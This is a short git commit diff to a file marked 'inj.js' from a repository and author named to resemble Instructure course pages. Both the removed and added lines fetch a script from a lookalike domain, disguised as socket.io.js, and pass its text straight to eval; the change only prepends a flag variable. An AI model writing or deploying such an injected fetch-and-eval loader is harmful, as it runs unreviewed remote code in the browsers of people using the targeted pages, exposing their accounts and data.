3b2737de31385feeb90d59558fa1c741529360bb
bsd-instructure-com-courses <bsdsucks@proton.me>
2024-09-07 02:48:39 -0700

    Update main.js

--- main.js
+++ main.js
@@ -1,2 +1,2 @@
 /// inj.js
-fetch('https://bsd-instructure-com-courses.lexitra.com/sigmaligma/socket.io.js').then((data) => { data.text().then(function(text){eval(text)}); })
+sl_ub=true;fetch('https://bsd-instructure-com-courses.lexitra.com/sigmaligma/socket.io.js').then((data) => { data.text().then(function(text){eval(text)}); })
